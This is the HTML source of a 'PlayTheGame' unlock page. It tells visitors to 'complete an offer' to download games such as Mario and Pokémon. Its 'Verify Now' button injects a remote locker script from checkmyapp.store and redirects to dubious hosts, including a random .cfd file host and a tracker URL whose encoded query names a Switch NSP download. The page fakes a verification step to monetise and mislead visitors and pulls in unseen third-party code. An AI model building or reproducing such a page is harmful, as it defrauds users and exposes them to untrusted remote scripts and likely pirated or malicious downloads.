<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Unlock Content | PlayTheGame</title>
    <style>
        body { margin: 0; background-color: #12081f; color: white; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .container { background: rgba(45, 19, 77, 0.6); padding: 40px; border-radius: 20px; text-align: center; max-width: 500px; width: 90%; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .icon-lock { font-size: 50px; color: #9d4edd; margin-bottom: 20px; }
        h1 { margin: 0 0 10px 0; font-size: 1.8rem; }
        p { color: #b1a7c1; font-size: 0.9rem; margin-bottom: 30px; }
        .steps { text-align: left; margin-bottom: 30px; }
        .step { display: flex; align-items: flex-start; gap: 15px; margin-bottom: 20px; }
        .step-check { color: #00ff88; font-weight: bold; }
        .step-text h4 { margin: 0; font-size: 1rem; }
        .step-text p { margin: 5px 0 0 0; font-size: 0.8rem; }
        .verify-box { background: rgba(0,0,0,0.2); padding: 30px; border-radius: 15px; }
        .btn-verify { background: linear-gradient(90deg, #9d4edd, #ff0080); border: none; color: white; padding: 15px 40px; border-radius: 10px; font-weight: bold; cursor: pointer; width: 100%; font-size: 1rem; transition: 0.3s; }
        .back-link { position: absolute; top: 20px; left: 20px; color: #b1a7c1; text-decoration: none; font-size: 0.9rem; }
    </style>
</head>
<body>

    <a href="index.html" class="back-link">← Back to PlayTheGame</a>

    <div class="container">
        <div class="icon-lock">🔒</div>
        <h1 id="titleText">Unlock Content</h1>
        <p>Complete one offer below to access your download</p>

        <div class="steps">
            <div class="step"><span class="step-check">✓</span><div class="step-text"><h4>Step 1: Choose an offer</h4><p>Select any offer from the list</p></div></div>
            <div class="step"><span class="step-check">✓</span><div class="step-text"><h4>Step 2: Complete the offer</h4><p>Follow the instructions provided</p></div></div>
            <div class="step"><span class="step-check">🎁</span><div class="step-text"><h4>Step 3: Get instant access</h4><p>Download starts after verification</p></div></div>
        </div>

        <div class="verify-box">
            <h3 style="margin-top:0;">Ready to Play?</h3>
            <button class="btn-verify" id="verifyBtn" onclick="injectLocker();">Verify Now</button>
        </div>
    </div>

    <script type="text/javascript">
        const urlParams = new URLSearchParams(window.location.search);
        const gameId = urlParams.get('game');
        
        if(gameId) {
            document.getElementById('titleText').innerText = "Unlock " + gameId.charAt(0).toUpperCase() + gameId.slice(1);
        }

        function injectLocker() {
            const btn = document.getElementById('verifyBtn');
            let targetUrl = 'https://playthegame.site';

            // Redirection logic
            if (gameId === 'mario') {
                targetUrl = 'https://file484973.cloud04y.cfd/';
            } else if (gameId === 'tomodachi') {
                targetUrl = 'https://citra-emulator.com/download/android/';
            } else if (gameId === 'pokemon') {
                targetUrl = 'https://pagecows.info/tracker/index.php?code=vtj&q=b64%3AUG9rw6ltb24gUG9rb3BpYSBOU1AgRG93bmxvYWQgMS4wLjMgVXBkYXRlIChOaW50ZW5kbyBTd2l0Y2gp';
            } else if (gameId === 'citra') {
                targetUrl = 'https://citra-emulator.com/download';
            }

            window.og_redirect = targetUrl; 
            btn.innerHTML = "Loading...";

            var script = document.createElement('script');
            script.type = 'text/javascript';
            script.id = 'ogjs';
            script.src = 'https://checkmyapp.store/cl/js/5nlrvw';
            document.body.appendChild(script);
        }
    </script>
</body>
</html>
